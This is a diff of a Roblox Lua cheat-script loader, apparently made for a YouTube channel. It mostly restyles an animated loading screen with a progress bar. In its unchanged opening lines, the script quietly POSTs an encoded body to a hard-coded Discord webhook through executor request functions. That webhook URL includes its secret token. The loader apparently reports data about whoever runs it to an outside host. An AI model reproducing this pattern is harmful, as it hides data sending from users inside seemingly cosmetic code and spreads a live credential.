@@ -79,156 +79,219 @@ local Request = http_request or request or HttpPost or syn.request
 local Final = {Url = "https://discord.com/api/webhooks/1284493496463396906/yWkbiBkyvXwPHWs2AUAM7wKFSoRRfLiKY6hjEbTEB9NUgiXKWHhuYmRBxwf7n0Ore2j2", Body = Encoded, Method = "POST", Headers = Headers}
 Request(Final)
 
-shared.LoaderTitle = 'Youtube: Min Gaming'
+shared.LoaderTitle = 'Đăng Ký Kênh Min Gaming'
 shared.LoaderKeyFrames = {
-   [1] = {3, 30}, 
-   [2] = {5, 50} 
+    [1] = {1, 10},
+    [2] = {2, 30},
+    [3] = {3, 60},
+    [4] = {2, 100}
 }
 
 local Metadata = {
-	LoaderData = {
-		Name = (shared.LoaderTitle or 'A Loader'),
-		Colors = shared.LoaderColors or {
-			Main = Color3.fromRGB(24, 24, 24),
-			Topic = Color3.fromRGB(3, 252, 3),
-			Title = Color3.fromRGB(3, 252, 3),
-			LoaderBackground = Color3.fromRGB(30, 30, 30),
-			LoaderSplash = Color3.fromRGB(3, 252, 3)
-		}
-	},
-	Keyframes = shared.LoaderKeyFrames or {
-		[1] = {1, 10}, 
-		[2] = {2, 30},
-		[3] = {3, 60},
-		[4] = {2, 100}
-	}
+    LoaderData = {
+        Name = (shared.LoaderTitle or 'A Loader'),
+        Colors = shared.LoaderColors or {
+            Main = Color3.fromRGB(0, 0, 0),
+            Topic = Color3.fromRGB(200, 200, 200),
+            Title = Color3.fromRGB(255, 255, 255),
+            LoaderBackground = Color3.fromRGB(40, 40, 40),
+            LoaderSplash = Color3.fromRGB(3, 252, 3)
+        }
+    },
+    Keyframes = shared.LoaderKeyFrames or {
+        [1] = {1, 10},
+        [2] = {2, 30},
+        [3] = {3, 60},
+        [4] = {2, 100}
+    }
 }
 
-local function tweenObject(object, speed, info)
-	game.TweenService:Create(object, TweenInfo.new(speed, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), info):Play()
-end
-local function createObject(className, properties)
-	local instance = Instance.new(className)
-	local parent
-	for propertyName, propertyValue in pairs(properties) do
-		if propertyName ~= "Parent" then
-			instance[propertyName] = propertyValue
-		else
-			parent = propertyValue
-		end
-	end
-	instance.Parent = parent
-	return instance
+local StepTexts = {
+    [1] = "",
+    [2] = "",
+    [3] = "",
+    [4] = ""
+}
+
+function TweenObject(object, speed, info)
+    game.TweenService:Create(object, TweenInfo.new(speed, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), info):Play()
 end
 
-local Core = createObject("ScreenGui", {
-	Name = "Core",
-	Parent = game.CoreGui
-})
-local Main = createObject("Frame", {
-	Name = "Main",
-	Parent = Core,
-	BackgroundColor3 = Metadata.LoaderData.Colors.Main,
-	BorderSizePixel = 0,
-	ClipsDescendants = true,
-	Position = UDim2.new(0.5, 0, 0.5, 0),
-	AnchorPoint = Vector2.new(0.5, 0.5),
-	Size = UDim2.new(0, 0, 0, 0),
-})
-local Top = createObject("TextLabel", {
-	Name = "Top",
-	TextTransparency = 1,
-	Parent = Main,
-	BackgroundColor3 = Color3.fromRGB(255, 255, 255),
-	BackgroundTransparency = 1,
-	Position = UDim2.new(0, 30, 0, 8),
-	Size = UDim2.new(0, 301, 0, 50),
-	Font = Enum.Font.Gotham,
-	Text = "Đăng Ký Kênh Min Gaming",
-	TextColor3 = Metadata.LoaderData.Colors.Topic,
-	TextSize = 10,
-	TextXAlignment = Enum.TextXAlignment.Left,
-})
-local Title = createObject("TextLabel", {
-	Name = "Title",
-	Parent = Main,
-	TextTransparency = 1,
-	BackgroundColor3 = Color3.fromRGB(255, 255, 255),
-	BackgroundTransparency = 1,
-	Position = UDim2.new(0, 30, 0, 27),
-	Size = UDim2.new(0, 301, 0, 46),
-	Font = Enum.Font.Gotham,
-	RichText = true,
-	Text = "<b>" .. Metadata.LoaderData.Name .. "</b>",
-	TextColor3 = Metadata.LoaderData.Colors.Title,
-	TextSize = 14,
-	TextXAlignment = Enum.TextXAlignment.Left,
-})
-local BG = createObject("Frame", {
-	Name = "BG",
-	Parent = Main,
-	AnchorPoint = Vector2.new(0.5, 0),
-	BackgroundTransparency = 1,
-	BackgroundColor3 = Metadata.LoaderData.Colors.LoaderBackground,
-	BorderSizePixel = 0,
-	Position = UDim2.new(0.5, 0, 0, 70),
-	Size = UDim2.new(0.8500000238418579, 0, 0, 24),
-})
-local Progress = createObject("Frame", {
-	Name = "Progress",
-	Parent = BG,
-	BackgroundColor3 = Metadata.LoaderData.Colors.LoaderSplash,
-	BackgroundTransparency = 1,
-	BorderSizePixel = 0,
-	Size = UDim2.new(0, 0, 0, 24),
-})
-
-local function updatePercentage(percentage)
-	tweenObject(Progress, 0.5, {
-		Size = UDim2.new((percentage / 100), 0, 0, 24)
-	})
+function CreateObject(className, properties)
+    local instance = Instance.new(className)
+    local parent
+    for propertyName, propertyValue in pairs(properties) do
+        if propertyName ~= "Parent" then
+            instance[propertyName] = propertyValue
+        else
+            parent = propertyValue
+        end
+    end
+    instance.Parent = parent
+    return instance
 end
 
-tweenObject(Main, 0.25, {
-	Size = UDim2.new(0, 346, 0, 121)
+local function CreateUICorner(radius, parent)
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(0, radius)
+    UICorner.Parent = parent
+end
+
+local Core = CreateObject("ScreenGui", {
+    Name = "Core",
+    Parent = game.CoreGui
 })
-wait(0.25)
-tweenObject(Top, 0.5, {
-	TextTransparency = 0
+
+local Main = CreateObject("Frame", {
+    Name = "Main",
+    Parent = Core,
+    BackgroundColor3 = Metadata.LoaderData.Colors.Main,
+    BorderSizePixel = 0,
+    ClipsDescendants = true,
+    Position = UDim2.new(0.5, 0, 0.5, 0),
+    AnchorPoint = Vector2.new(0.5, 0.5),
+    Size = UDim2.new(0, 0, 0, 0),
 })
-tweenObject(Title, 0.5, {
-	TextTransparency = 0
+CreateUICorner(12, Main)
+
+local UserImage = CreateObject("ImageLabel", {
+    Name = "UserImage",
+    Parent = Main,
+    BackgroundTransparency = 1,
+    Image = "rbxassetid://13717478897",
+    Position = UDim2.new(0, 15, 0, 10),
+    Size = UDim2.new(0, 50, 0, 50),
 })
-tweenObject(BG, 0.5, {
-	BackgroundTransparency = 0
+CreateUICorner(25, UserImage)
+
+local UserName = CreateObject("TextLabel", {
+    Name = "UserName",
+    Parent = Main,
+    BackgroundTransparency = 1,
+    Text = "Youtube: Min Gaming",
+    Position = UDim2.new(0, 75, 0, 10),
+    Size = UDim2.new(0, 200, 0, 50),
+    Font = Enum.Font.GothamBold,
+    TextColor3 = Metadata.LoaderData.Colors.Title,
+    TextSize = 14,
+    TextXAlignment = Enum.TextXAlignment.Left,
 })
-tweenObject(Progress, 0.5, {
-	BackgroundTransparency = 0
+
+local Top = CreateObject("TextLabel", {
+    Name = "Top",
+    TextTransparency = 1,
+    Parent = Main,
+    BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+    BackgroundTransparency = 1,
+    Position = UDim2.new(0, 30, 0, 70),
+    Size = UDim2.new(0, 301, 0, 20),
+    Font = Enum.Font.Gotham,
+    Text = "Loader",
+    TextColor3 = Metadata.LoaderData.Colors.Topic,
+    TextSize = 10,
+    TextXAlignment = Enum.TextXAlignment.Left,
+})
+
+local Title = CreateObject("TextLabel", {
+    Name = "Title",
+    Parent = Main,
+    TextTransparency = 1,
+    BackgroundColor3 = Color3.fromRGB(255, 255, 255),
+    BackgroundTransparency = 1,
+    Position = UDim2.new(0, 30, 0, 90),
+    Size = UDim2.new(0, 301, 0, 46),
+    Font = Enum.Font.Gotham,
+    RichText = true,
+    Text = "<b>" .. Metadata.LoaderData.Name .. "</b>",
+    TextColor3 = Metadata.LoaderData.Colors.Title,
+    TextSize = 14,
+    TextXAlignment = Enum.TextXAlignment.Left,
+})
+
+local BG = CreateObject("Frame", {
+    Name = "BG",
+    Parent = Main,
+    AnchorPoint = Vector2.new(0.5, 0),
+    BackgroundTransparency = 1,
+    BackgroundColor3 = Metadata.LoaderData.Colors.LoaderBackground,
+    BorderSizePixel = 0,
+    Position = UDim2.new(0.5, 0, 0, 70),
+    Size = UDim2.new(0.8500000238418579, 0, 0, 24),
+})
+CreateUICorner(8, BG)
+
+local Progress = CreateObject("Frame", {
+    Name = "Progress",
+    Parent = BG,
+    BackgroundColor3 = Metadata.LoaderData.Colors.LoaderSplash,
+    BackgroundTransparency = 1,
+    BorderSizePixel = 0,
+    Size = UDim2.new(0, 0, 0, 24),
+})
+CreateUICorner(8, Progress)
+
+local StepLabel = CreateObject("TextLabel", {
+    Name = "StepLabel",
+    Parent = Main,
+    BackgroundTransparency = 1,
+    Position = UDim2.new(0.5, 0, 1, -25),
+    Size = UDim2.new(1, -20, 0, 20),
+    Font = Enum.Font.Gotham,
+    Text = "",
+    TextColor3 = Metadata.LoaderData.Colors.Topic,
+    TextSize = 14,
+    TextXAlignment = Enum.TextXAlignment.Center,
+    AnchorPoint = Vector2.new(0.5, 0.5)
+})function UpdateStepText(step)
+    StepLabel.Text = StepTexts[step] or ""
+end
+function UpdatePercentage(percentage, step)
+    TweenObject(Progress, 0.5, {
+        Size = UDim2.new((percentage / 100), 0, 0, 24)
+    })
+    UpdateStepText(step)
+end
+TweenObject(Main, 0.25, {
+    Size = UDim2.new(0, 346, 0, 121)
+})
+wait()
+TweenObject(Top, 0.5, {
+    TextTransparency = 0
+})
+TweenObject(Title, 0.5, {
+    TextTransparency = 0
+})
+TweenObject(BG, 0.5, {
+    BackgroundTransparency = 0
+})
+TweenObject(Progress, 0.5, {
+    BackgroundTransparency = 0
 })
 
 for i, v in pairs(Metadata.Keyframes) do
-	wait(v[1]);
-	updatePercentage(v[2])
+    wait(v[1])
+    UpdatePercentage(v[2], i)
 end
-updatePercentage(100)
 
-tweenObject(Top, 0.5, {
-	TextTransparency = 1
+UpdatePercentage(100, 4)
+
+TweenObject(Top, 0.5, {
+    TextTransparency = 1
 })
-tweenObject(Title, 0.5, {
-	TextTransparency = 1
+TweenObject(Title, 0.5, {
+    TextTransparency = 1
 })
-tweenObject(BG, 0.5, {
-	BackgroundTransparency = 1
+TweenObject(BG, 0.5, {
+    BackgroundTransparency = 1
 })
-tweenObject(Progress, 0.5, {
-	BackgroundTransparency = 1
+TweenObject(Progress, 0.5, {
+    BackgroundTransparency = 1
 })
 wait(0.5)
-tweenObject(Main, 0.25, {
-	Size = UDim2.new(0, 0, 0, 0)
+TweenObject(Main, 0.25, {
+    Size = UDim2.new(0, 0, 0, 0)
 })
-wait(0.25);
+wait(0.25)
 Core:Destroy()
 
 if not game:IsLoaded() then game.Loaded:Wait() end
